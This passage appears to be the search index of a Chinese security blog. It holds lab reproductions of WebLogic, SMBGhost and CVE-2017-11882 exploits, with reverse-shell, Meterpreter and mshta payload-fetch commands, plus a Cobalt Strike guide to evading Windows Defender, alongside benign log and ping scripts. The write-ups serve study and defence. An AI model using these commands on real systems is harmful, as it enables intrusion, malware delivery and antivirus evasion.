Upgrade-Insecure-Requests: 1 接着靶机上getshell，nc -l -p 21获取反弹shell。成功。\n释放靶场 docker-compose down",
    "description": "",
    "tags": "红蓝对抗,漏洞复现",
    "title": "CVE-2014-4210_Weblogic SSRF漏洞",
    "uri": "/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Vulhub%E5%AE%9E%E9%AA%8C_Weblogic_SSRF%E6%BC%8F%E6%B4%9E/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "漏洞复现",
    "uri": "/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - 红蓝对抗,漏洞复现",
    "uri": "/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html"
  },
  {
    "content": "影响版本 Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware (component: Core). 受影响版本：10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 以及 14.1.1.0.0. 影响：简单的漏洞利用即可允许攻击者通过IIOP未授权访问Oracle WebLogic T3。攻击者可利用漏洞接管网站。 CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)\n环境搭建 docker pull z1du/weblogic12214jdk8u181 windows10 https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html12\n漏洞验证 工具准备： git clone git@github.com:mbechler/marshalsec.git mvn clean package -DskipTests\n漏洞poc测试 通过nmap检测版本\nnmap -n -v -Pn –sV IP地址 -p 端口 --script=/usr/share/nmap/scripts/weblogic-t3-info.nse PORT STATE SERVICE 7001/tcp open afs3-callback |_weblogic-t3-info: T3 protocol in use (WebLogic version: 12.2.1.4) 测试RCE rce编译 编译： RevShell.java 编译class文件 javac RevShell.java\n开启http服务，挂在class文件\npython3 -m http.server 5001访问本地http://192.168.31.102:5001/RevShell.class 200，可访问挂载成功\n配置开启LDAP服务 java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec. [-a] [-v] [-t] [\u003cgadget_type\u003e [\u003carguments…\u003e]] java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.31.102:5001/#RevShell 1099 rce 命令执行 java -jar CVE-2020-14645.jar 192.168.31.102:1099/#RevShell http://test.com:7001 Weblogic version: 12.2.1.4 反弹shell ",
    "description": "",
    "tags": "红蓝对抗,漏洞复现",
    "title": "CVE-2020-14645_weblogic_T3反序列化RCE复测",
    "uri": "/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-14645_weblogic_T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%A4%8D%E6%B5%8B/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - 威胁情报,Thrip",
    "uri": "/tags/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5Thrip/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "情报跟踪",
    "uri": "/%E6%83%85%E6%8A%A5%E8%B7%9F%E8%B8%AA/index.html"
  },
  {
    "content": "By Catalin Cimpanu\n文章出处：https://www.bleepingcomputer.com/news/security/chinese-hackers-target-satellite-geospatial-imaging-defense-companies/\n一个据信在中国以外活动的网络间谍组织攻击了开发卫星通信、地理空间成像和来自美国和东南亚的国防承包商的公司。美国网络安全公司赛门铁克(Symantec)昨日在一份报告中表示，黑客对被入侵公司的运营方面表现出了特别的兴趣。黑客们试图接触并密切关注用于控制通信卫星的计算机系统，或使用世界地图卫星收集的地理空间数据的计算机系统。赛门铁克表示:“这向我们表明，(该集团)的动机不只是从事间谍活动，还可能包括破坏。”有人担心，黑客可能甚至试图破坏卫星或毒物地理空间数据。\n黑客背后的\"Thrip\"网络间谍组织 该公司表示，对此次攻击负责的是一种高级的持续性威胁(APT，用来描述网络间谍组织)，以Thrip(网络间谍组织)的代号命名。赛门铁克表示，该公司自2013年以来一直在跟踪这一集团，并一直认为该集团在中国以外运营。该公司表示，最近的攻击难以察觉。黑客使用了一种被称为“靠土地为生”的技术，该技术包括使用操作系统上已有的本地工具进行恶意操作。赛门铁克解释说:“靠土地为生的目的有两个方面。”通过使用这些功能和工具，攻击者希望融入受害者的网络，并将他们的活动隐藏在合法程序的海洋中。其次，即使检测到涉及这些工具的恶意活动，也会使属性攻击更加困难。赛门铁克称，黑客使用了以下本地安装的、完全合法的工具……\n…安装定制的恶意软件，例如:\n早在2018年1月就发现黑客入侵赛门铁克表示，只有在其一款基于人工智能和机器学习的工具引发对可疑使用合法工具的警告后，该公司才发现了这些攻击。专家们表示，他们已经利用这一最初的警报来揭示妥协的初步迹象，然后利用这一线索来揭示针对多个国家和行业领域的多家公司的更广泛行动。这场黑客攻击的目的显然是网络间谍活动。该公司说，它在1月份发现了这一行动，但Thrip黑客攻击行动可能比该公司目前报告的范围更广。\nRelated Articles: Chinese Cyber-Espionage Group Hacked Government Data Center Chinese Cyberspies Appear to be Preparing Supply-Chain Attacks Malware That Hit Pyeongchang Olympics Deployed in New Attacks InvisiMole Is a Complex Spyware That Can Take Pictures and Record Audio Adobe Patches Flash Zero-Day\n",
    "description": "",
    "tags": "威胁情报,Thrip",
    "title": "黑客背后的\"Thrip\"网络间谍组织",
    "uri": "/%E6%83%85%E6%8A%A5%E8%B7%9F%E8%B8%AA/%E6%83%85%E6%8A%A5-Chinese_Hackers_Target_SatelliteGeospatial_ImagingDefense_Companies/index.html"
  },
  {
    "content": "CVE-2020-0796 ‘SMBGhost’ Remote Code Execution 漏洞描述： 在Windows SMBv3版本的客户端和服务端存在远程代码执行漏洞。同时指出该漏洞存在于MicroSoft Server Message Block 3.1.1协议处理特定请求包的功能中，攻击者利用该漏洞可在目标SMB Server或者Client中执行任意代码。\n漏洞原理： https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/ https://ricercasecurity.blogspot.com/2020/04/ill-ask-your-body-smbghost-pre-auth-rce.html https://mp.weixin.qq.com/s/vM4jPmklOmFTVo3xI-0JFg\n影响版本： Windows 10 Version 1903 for 32-bit Systems Windows 10 Version 1903 for ARM64-based Systems Windows 10 Version 1903 for x64-based Systems Windows 10 Version 1909 for 32-bit Systems Windows 10 Version 1909 for ARM64-based Systems Windows 10 Version 1909 for x64-based Systems Windows Server, version 1903 (Server Core installation) Windows Server, version 1909 (Server Core installation) 补丁检测： systeminfo | findstr KB4551762smb服务确认：（只影响 SMB v3.1.1，1903和1909）因为 SMBv2 和 SMBv3 共用一个堆叠，所以在 Windows 8 或 Windows Server 2012 中启用或禁用 SMBv2 时，也会启用或禁用 SMBv3\nPS C:\\Windows\\system32\u003e Get-SmbServerConfiguration | Select EnableSMB1Protocol, EnableSMB2Protocol EnableSMB1Protocol EnableSMB2Protocol ------------------ ------------------ True True漏洞检测poc： 漏洞利用exp： RCE: https://www.exploit-db.com/exploits/48537 LPE: https://github.com/ZecOps/CVE-2020-0796-LPE-POC\n漏洞复现： 环境搭建： 靶机：Windows 10 Version 1909 for x64-based Systems（） windows 10 version 1903 x64 (192.168.145.146) 攻击：kali2020 (192.168.145.136) exp： https://www.exploit-db.com/exploits/48537 （完整exp： https://github.com/you0708/lznt1 ） https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/48537.zip 环境准备： 开启smb3.0 运行\u003econtrol,选择程序及功能 打开windows功能SMB 1.0/CIFS 文件共享支持，重启， 查看SMB2.0(3.0共用服务)是否开启 ps\u003eGet-SmbServerConfiguration | Select 关闭防火墙 测试记录： 调整exp的攻击内容，通过msf生成shellcode在受害者主机开启个5555为端口的（spoolsv.exe）监听连接进程 msfvenom -p windows/x64/meterpreter/bind_tcp lport=5555 -f py -o Desktop/shellcode.txt 注： 这里将shellcode复制替换进exp的user_payload中，且应注意字符长度不应超过600字符 准备就绪执行exp python3 exploit.py -ip 192.168.145.146 # 配置存在问题的ip并执行 执行成功\nkali@kali:~/Desktop/SMBGhost_RCE_PoC-master$ python3 exploit.py -ip 192.168.145.146 [+] found low stub at phys addr 13000! [+] PML4 at 1ad000 [+] base of HAL heap at fffff7b0c0000000 [+] found PML4 self-ref entry 152 [+] found HalpInterruptController at fffff7b0c0001478 [+] found HalpApicRequestInterrupt at fffff8026e55ebb0 [+] built shellcode! [+] KUSER_SHARED_DATA PTE at ffffa97bc0000000 [+] KUSER_SHARED_DATA PTE NX bit cleared! [+] Wrote shellcode at fffff78000000950! [+] Press a key to execute shellcode! [+] overwrote HalpInterruptController pointer, should have execution shortly...此时在被攻击机内存中出现一条进程spoolsv.exe，监听端口为5555，下面使用msf连接。\n配置连接受害者机器及端口 msf5 \u003e use exploit/multi/handler msf5 exploit(multi/handler) \u003e set payload windows/x64/meterpreter/bind_tcp #设置连接模式，直连 msf5 exploit(multi/handler) \u003e set rhost 192.168.145.146 #设置目标靶机IP地址 msf5 exploit(multi/handler) \u003e set lport 5555 #设置靶机监听的端口 msf5 exploit(multi/handler) \u003e exploit -j -t [*] Exploit running as background job 0. [*] Exploit completed, but no session was created. msf5 exploit(multi/handler) \u003e [*] Started bind TCP handler against 192.168.145.146:5555 [*] Sending stage (201283 bytes) to 192.168.145.146 [*] Meterpreter session 1 opened (0.0.0.0:0 -\u003e 192.168.145.146:5555) at 2020-06-11 02:57:49 -0400session上线。 一个意外发现 python2执行命令，脚本执行异常可导致蓝屏现象 载入执行exp python exploit.py -ip 192.168.145.146\nhttps://mp.weixin.qq.com/s/vM4jPmklOmFTVo3xI-0JFg\n修复建议： CVE-2020-0796是内存破坏漏洞，精心利用可导致远程代码执行，同时网络上已经出现该漏洞的本地提权利用代码。在此，建议受影响版本Windows用户及时根据微软官方漏洞防护公告对该漏洞进行防护。\n",
    "description": "",
    "tags": "红蓝对抗,漏洞复现",
    "title": "CVE-2020-0796 'SMBGhost' Remote Code Execution",
    "uri": "/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-0796_SMBGhost_Remote_Code_Execution/index.html"
  },
  {
    "content": "CVE-2017-11882 Office远程代码执行漏洞及一点思考 0x01 概述 作为上一代office通杀漏洞，CVE-2017-11882是典型的具有APT危害漏洞之一，常见于APT检测样本中，其曾经潜伏17年之久的并于2017年被公开的可以通杀office2003到2016的所有版本的漏洞，攻击者只需给目标发送一个制作好的word文档并且这个文档被打开即可完成攻击。CVE-2017-11882 通杀office2003到2016的所有版本。这里通过本次实验将让大家了解到其利用全过程，更好的推动相关安防工作。\n影响版本： Office 365 Microsoft Office 2000 Microsoft Office 2003 Microsoft Office 2007 Service Pack 3 Microsoft Office 2010 Service Pack 2 Microsoft Office 2013 Service Pack 1 Microsoft Office 2016\n0x02 实践 根据已有的资料，发现可用的检测方式主要两种可以尝试的思路，MSF模块以及大佬们写的一些工具\n第一种：使用MSF模块office_ms17_11882 环境搭建 测试目标：office 2013、office2010、office2007 靶机：win2008 攻击：kali2 测试环境环境：\nkali: 192.168.1.128 win2008(x64):192.168.1.100 office2013 64位专业版 microsoft word 2013(15.0.4569.1504) MSO(15.0.4569.1506) 64位 office2010 64位专业版 microsoft office professional plus 2010（14.0.6023.1000）64位 实验工具： exploit/windows/fileformat/office_ms17_11882 操作步骤： 参考：https://www.jianshu.com/p/6f5e23cbbe70\nmsf\u003euse exploit/windows/fileformat/office_ms17_11882\n设置监听主机 msf\u003eset lhost 192.168.1.128\n设置uripath msf\u003eset uripath 111.doc\nmsf exploit(office_ms17_11882) \u003e show options Module options (exploit/windows/fileformat/office_ms17_11882): Name Current Setting Required Description ---- --------------- -------- ----------- FILENAME msf.rtf yes Filename to save as SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address on the local machine or 0.0.0.0 SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL for incoming connections SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH 111.doc no The URI to use for this exploit (default is random) Payload options (windows/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST yes The listen address LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic run\nmsf exploit(office_ms17_11882) \u003e exploit [*] Using URL: http://0.0.0.0:8080/111.doc [*] Local IP: http://127.0.0.1:8080/111.doc [*] Server started. [+] msf.,rtf stored at /root/.msf4/local/msf.rtf 在受害者机器打开文件 office 13失败 office 2007失败 msf接收反弹失败：\nmsf\u003e ...... [*] Delivering payload to 192.168.1.105 ... [*] Delivering payload to 192.168.1.105 ... [*] Delivering payload to 192.168.1.105 ... 第二种：使用独立脚本方式 这里使用到的工具有： https://github.com/Ridter/CVE-2017-11882/ https://github.com/starnightcyber/CVE-2017-11882 参考文章：https://www.cnblogs.com/Hi-blog/p/7878054.html\n首先测试漏洞情况：用到https://github.com/Ridter/CVE-2017-11882/ 里面的脚本\n\u003epython Command109b_CVE-2017-11882.py -c \"cmd.exe /c calc.exe\" -o cve-2017-11882.doc [*] Done ! output file --\u003e cve-2017-11882.doc测试弹窗rtf office2010触发 office2013触发 漏洞存在，那么下一步尝试进一步利用。 这里用到https://github.com/starnightcyber/CVE-2017-11882 里面的msf脚本。 将脚本PS_shell.rb放到metasploit exploit的某个路径下：\nmkdir /usr/share/metasploit-framework/modules/exploits/windows/new-exp\u0026\u0026mv PS_shell.rb /usr/share/metasploit-framework/modules/exploits/windows/new-exps进入msf利用：\nmsf\u003e use exploit/windows/new-exp/PS_shell msf exploit(PS_shell) \u003e set payload windows/meterpreter/reverse_tcp payload =\u003e windows/meterpreter/reverse_tcp msf exploit(PS_shell) \u003e set lhost 192.168.1.128 lhost =\u003e 192.168.1.128 msf exploit(PS_shell) \u003e set uripath exp uripath =\u003e exp1711882 msf exploit(PS_shell) \u003e show options Module options (exploit/windows/new-exp/PS_shell): Name Current Setting Required Description ---- --------------- -------- ----------- SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address on the local machine or 0.0.0.0 SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL for incoming connections SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH exp no The URI to use for this exploit (default is random) Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 192.168.1.128 yes The listen address LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic msf exploit(PS_shell) \u003e run [*] Exploit running as background job. [*] Started reverse TCP handler on 192.168.1.128:4444 [*] Using URL: http://0.0.0.0:8080/exp [*] Local IP: http://127.0.0.1:8080/exp [*] Server started. [*] Place the following DDE in an MS document: mshta.exe \"http://192.168.1.128:8080/exp\"接着需要使用脚本生成上面语句的exp文件\npython Command_CVE-2017-11882.py -c \"mshta.exe http://192.168.1.128:8080/exp \" -o exp_recon3.doc [*] Done ! output file \u003e\u003e exp_recon3.doc \u003c\u003c 这里发现该脚本不能输入超过43字符，所以在输出命令时候要配合调整uripath路径。\n发给受害者点击，成功，meterpreter up。 0x03 总结 综上可以看到，msf自带方式未能在本次实验中利用成功，通常的利用方式应该仅仅通过各位研究员的脚本来执行。\n0x04 进一步研究方向推荐 为了方便同学们进一步学习研究，这里提供一些后续的研究思路供大家拓展：\n可从代码角度，通过对office角度进行探查，分析原理，尤其遇到的脚本长度限制和msf未能成功问题 配合漏洞的一些现实案例和社工案例的汇总及分析 从监测检测角度思考的话，如何发现和对抗发现进一步优化 0x05 一些参考 https://www.jianshu.com/p/b6bc1ba0c997 https://www.cnblogs.com/Hi-blog/p/7878054.html https://www.cnblogs.com/pshell/p/7875416.html https://github.com/embedi/CVE-2017-11882 https://github.com/starnightcyber/CVE-2017-11882 https://github.com/Ridter/CVE-2017-11882/ 官方补丁：https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882\n",
    "description": "",
    "tags": "红蓝对抗,漏洞复现",
    "title": "CVE-2017-11882 Office远程代码执行漏洞复现",
    "uri": "/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2017-11882_Office%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%8F%8A%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/index.html"
  },
  {
    "content": "Cobalt Strike – Bypassing Windows Defender with Obfuscation Cobalt Strike 使用混淆绕WindowsDefender 原文：http://www.offensiveops.io/tools/cobalt-strike-bypassing-windows-defender-with-obfuscation/ （2018-03) 翻译：XT.\n对于这样一篇18年的文章我们发现目前由于攻防软件的升级，目前已经不再适用绕过了，但是其中的一些手法和方式仍然值得学习借鉴，针对新工具下的攻防仍待进一步学习研究。\n0x01 前言 对所有红队来说想要提交个payloads并不触发任何告警一直是一个挑战。就像所有安全检测方案一样，Windows Defender可作为测试如Cobalt Strike生成的payload的一个检测工具。\n0x02 分析 在这个样本中我们将会使用Cobalt Strike生成一段powershell payload，之后看看我们如何操作他并让它绕过一台Windows10 PC的Windows Defender。这或许并不是最优雅或者最简单的方法在Windows Defender防护下隐藏你的payloads，但是这是我们使用过的有效的方法之一。\n创建payload的过程如下：\n经测试发现这里分析不包括x64情况，因为x64生成的代码后面会生成\n这会生成包含有PowerShell指令的一个文件payload.txt 如果我们尝试在受害者PC执行命令，我们将会被Windows Defender捕获威胁行为。 为了绕过Windows Defender我们需要了解下，Cobalt Strike是如何创建payloads的，并且希望当修改一些特征让Windows Defender判定payloads为安全。\n第一步当然payload指令base64位编码，通过查找格式转化或者通过Powershell指令追加-encodedcommand标定。\n为了解码并且观察创建payload暂时先跳过这段\npowershell.exe -nop -w hidden -encodedcommand使这段先不看。\n然后使用下面的代码反编码剩下的字符：\n这里测试环境失败了我换了个方式\necho 'base64 payload' | base64 -d这里用了powershell base64解码方式：\nfunction Dncoded-Base64String([string]$string){ $byteArray = [Convert]::FromBase64String($string) [System.Text.UnicodeEncoding]::Unicode.GetString($byteArray)} $wishWords = 'base64 payload here' $wishWords = Dncoded-Base64String $wishWords $wishWords.Substring(0) 合成解码字符包括又一个base64编码的字符，但是尝试解码失败并出现乱码，由于这段字符被下面的Powershell代码Gzip压缩过的： IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()\n笔者一次base64之后结果如下： 现在我们需要知道里面的命令那一部分payload实际触发了Windows Defender。通过一些谷歌搜索发现这段PowerShell脚本工具可用于解码，如这个链接内容介绍：http://chernodv.blogspot.com.cy/2014/12/powershell-compression-decompression.html\n$data = [System.Convert]::FromBase64String('gzip base64') $ms = New-Object System.IO.MemoryStream $ms.Write($data, 0, $data.Length) $ms.Seek(0,0) | Out-Null $sr = New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)) $sr.ReadToEnd() | set-clipboard 笔者Gzip解码后结果如下： 这个脚本会第一步执行base64解码字符并且解压缩最后得到整段代码。最后复制结果到剪切板，执行成功只需要粘贴即可保存。\n$var_code值即存放着被WindowsDefender检测的payload，我们需要替换并绕过检测防护。\n进一步解码$var_code发现其是由一些ASCII字符构成，但是这里并不需要完全解码它：\n$enc=[System.Convert]::FromBase64String('encoded string')我们可以通过下面的代码阅读其中的内容：\n$readString=[System.Text.Encoding]::ASCII.GetString($enc) 笔者payload解码: 在上面的信息中可以看到UA及攻击者IP。\n0x03 加混淆 目标使用当前的payload并混淆的方式会触发Windows Defender。最好的工具并且可选择Invoke-Obfuscation种类的一个工具是Daniel Bohannon(https://twitter.com/danielhbohannon?lang=en)，其git地址为：https://github.com/danielbohannon/Invoke-Obfuscation 。\n启动Invoke-Obfuscation的方式如下：\nImport-Module .\\Invoke-Obfuscation.psd1 Invoke-Obfuscation现在我们需要定义我们需要混淆的payload部分。可以使用下面的指令，再进行一次混淆操作：\nSet scriptblock 'final_base64payload' 插一句，这里执行的时候其实是触发了火绒，但是Windows Defender并未触发，火绒放行即可： 该工具会获取我们的脚本然后询问我们想要执行混淆的方式。在这里我选择了COMPRESS，选择1。这并不意味着其他参数不起作用，只是作者编写时发现这个有效。Invoke-Obfuscation处理并输出充分混淆后的PowerShell命令，将潜在的可以绕过Windows Defender。 之后打印输出保存\nOut c:\\payload.ps1 替换掉原来的被解压的payload如下所示看起来这样： 因此最后我们需要通过Invoke-Obfuscation创建新的[Byte[]]$var_code = [System.Convert]::FromBase64String的内容替换原payload。 为了完成这一步，这里定义了一个新的变量命名$evil然后把由Invoke-Obfuscation混淆后的内容放在其中。 重点：你需要从invoke-Obfuscation输出的内容中剔除 |，因为它是命令执行的指令。我们不需要它因为Cobalt Strike模板会处理这个。\n原文的图片实在是太模糊了，吐\n本地测试按照提示进行替换，并保存为.ps1文件，放入靶机测试 经测试，发现目前此方式由于非base64导致报错，导致脚本无法执行成功 保存编辑的脚本到powershell文件并执行。当Cobalt Strike中的beacon点亮，并出现提示@sec_groundzero Aggressor 脚本的注意之后成功。\n如果我们同时检查原始 CS payload和修改过的 CS payload，通过Process Hacker我们看到我们并不会改变beacon的行为。\n在最后，整体实践结果发现，文中提到的cs powershell 混淆的思路是先解base64再解gzip压缩，然后针对payload有效部分进行专用工具混淆。而目前出现的问题是，payload只能混淆x86的，而测试x64payload使用此文的混淆会出现混淆报错。另外x86混淆之后再通过添加新变量引入混淆后的字符过程目前测试会导致报错，因此实验未能达到预期目的，这部分内容会在后续跟进。\n",
    "description": "",
    "tags": "红蓝对抗,CobaltStrike",
    "title": "CS X86 payload分析混淆加密",
    "uri": "/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-Cobalt_Strike-x86_payload_%E5%88%86%E6%9E%90%E5%8F%8A%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - 红蓝对抗,CobaltStrike",
    "uri": "/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97CobaltStrike/index.html"
  },
  {
    "content": "Coremail Log Analyze script 同学在应急的时候遇到coremail日志取证问题，量比较大，需要针对邮件或IP搜索。这里做了个简易的筛选方便大家在应急的分析使用。 针对这类日志进行关键自筛选并输出。\n方案 这里全遍历文件，读取文件筛选匹配关键字整行另存新文件保存\n使用方法 Usage: python3 CLA.py \u003clogfolders\u003e \u003ckey\u003e \u003coutput_filename\u003elogfolders 日志文件夹（测试环境下现场取的folder/folders/log结构文件夹） key 搜索关键字，关键字或用逗号（,）隔开的关键字组 output_filename 保存文件位置及文件名\n源码 # python3 # -*- encoding: utf-8 -*- # Pwnda.zhang\u003cXTPEEPS.CN\u003e import os,re,sys def main(dir,key,output_filename): for home,dirs,files in os.walk(dir): # print(\"-----dir list------\") for dir in dirs: print(dir) # print(\"------dir list end------\") # print(\"------file list------\") for filename in files: print(filename) fullname=os.path.join(home,filename) analyze(key,fullname,output_filename) # print(fullname) # print(\"------file list end------\") def analyze(key,filename,output_filename): file=open(filename,'r') with open(output_filename,\"a+\") as f: f.write(\"\\n\"+filename+\"\\n\") for line in file: if re.search(\",\",key): keys=key.replace(\",\",\"|\") keyline=re.findall(keys,line) else: keyline=re.findall(\".*{}.*\".format(key),line) if keyline : print(line) f.write(line) else: continue f.close() file.close() if __name__==\"__main__\": # if sys.argv[1]!=\"\" and sys.argv[2]!=\"\" and sys.argv[3]!=\"\": try: main(sys.argv[1],sys.argv[2],sys.argv[3]) except: print(\"Usage: python3 CLA.py \u003clogfolders\u003e \u003ckey\u003e \u003coutput filename\u003e\")",
    "description": "",
    "tags": "工具开发,脚本,日志分析",
    "title": "Coremail日志分析脚本",
    "uri": "/%E5%B7%A5%E5%85%B7/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/%E5%B7%A5%E5%85%B7-coremail%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AD%9B%E9%80%89%E7%AE%80%E6%98%93%E8%84%9A%E6%9C%AC/index.html"
  },
  {
    "content": " 对于大量UnsafeHttpMethod类型漏洞一直苦于耗费时间，而几乎无产出，对于安全检测人员来说简直是浪费了不必要的时间，所以根据具体的几种常见的漏洞通过脚本的形式进行批量检测成为了最值得研究的。本文设计的Method_test.py模块用于检测OPTIONS,PUT,DELETE,TRACE方法脚本，支持单测、批测，批测中断，生成记录文档。\n需求 对于大量UnsafeHttpMethod类型漏洞一直苦于耗费时间，而几乎无产出，对于安全检测人员来说简直是浪费了不必要的时间，所以根据具体的几种常见的漏洞通过脚本的形式进行批量检测成为了最值得研究的。\n漏洞名称：启用了不安全的HTTP方法 危险等级：中 **漏洞描述：**Web服务器配置为允许使用危险的HTTP方法，如PUT、MOVE、COPY、DELETE、PROPFIND、SEARCH、MKCOL、LOCK、UNLOCK、PROPPATCH，该配置可能允许未授权的用户对Web服务器进行敏感操作。\nmethod_test 检测OPTIONS,PUT,DELETE,TRACE\n功能： 支持单个url检测、批测， 批测可以中断， 生成记录文档 用法: method_test.py [option] [parameter] -h this help -u \u003curl\u003e -r \u003cFilePath\u003eeg. ”method_test.py -u http://baidu.com\"\neg. “method_test.py -r d:\\url.txt” (url.txt内容需统一带http/https://)\n【Git下载地址】method_test.py\n",
    "description": "",
    "tags": "工具开发,脚本",
    "title": "UnsafeHttpMethod类型漏洞检测脚本",
    "uri": "/%E5%B7%A5%E5%85%B7/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E5%B7%A5%E5%85%B7/%E5%B7%A5%E5%85%B7-httpmethod-unsafehttpmethod%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E6%80%9D%E8%B7%AF%E5%92%8C%E6%96%B9%E6%B3%95/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - 工具开发,脚本",
    "uri": "/tags/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91%E8%84%9A%E6%9C%AC/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - 工具开发,脚本,日志分析",
    "uri": "/tags/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91%E8%84%9A%E6%9C%AC%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "日志分析工具",
    "uri": "/%E5%B7%A5%E5%85%B7/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/index.html"
  },
  {
    "content": "本地批量ping域名脚本 背景是同学在执行一批渗透时需要批量验证一批域名本地ping情况，这里通过powershell脚本简单制作了一个思路供同学们参考。 源码如下：\n\u003c#Author :PWN.ZHANG@XTPEEPS\u003eCN#\u003e if($args[0] -ne \"\"){ $File=Get-Content $args[0] foreach ($skuLine in $File) { Write-Host -NoNewline $skuLine \" \" (((ping $skuLine -n 1) -match \"^(\\d{1,3}\\.){3}\\d{1,3}\") -split \" \")[0]} \u003c#Sleep 100#\u003e } Else { \"useage: xx.ps \u003curlfile_path\u003e\" }",
    "description": "",
    "tags": "工具开发,脚本",
    "title": "本地批量ping域名脚本",
    "uri": "/%E5%B7%A5%E5%85%B7/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/%E5%B7%A5%E5%85%B7-%E6%9C%AC%E5%9C%B0%E6%89%B9%E9%87%8Fping%E5%9F%9F%E5%90%8D%E8%84%9A%E6%9C%AC/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - 恶意样本分析,实例",
    "uri": "/tags/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%AE%9E%E4%BE%8B/index.html"
  },
  {
    "content": "Trojan/Buzus“霸族”木马通过邮件传播 背景 探针恶意邮件样本中发现此木马，邮件内容如下：\n收件人:\u003c脱敏内容\u003e 日期:Mon, 9 Sep 2019 12:58:31 +0800 主题:You have got a new message on Facebook! 邮件内容:Facebookfacebook Hi,You have got a personal message on Facebook from your friend.To read it please check the attachment.Thanks, The Facebook Team 附件:Facebook message.zip(227130)关于buzus 翻阅网上的关于霸族的资料介绍如下： W32/Buzus是一种蠕虫，它通过将自身复制到可移动驱动器来传播，并试图从受损的计算机中窃取机密信息。https://www.symantec.com/security-center/writeup/2009-121019-2757-99 霸族本身存在蠕虫行为，且存在传染性可能。本次样本发现为木马类buzus，或同源Trojan.AgentWDCR.HWI行为，基于各厂商对病毒命名不同略有差别。https://www.virustotal.com/gui/file/e41e19b9ee8889b3887b8cacf264468c661bdf382706bbd9052c1f95c4eea504/detection\n基本信息 文件名称：\tdocument.exe 文件大小：\t394KB (403968bytes) 文件类型：\tPE32 executable (GUI) Intel 80386, for MS Windows 开始时间：\t2019-09-09 12:54:18 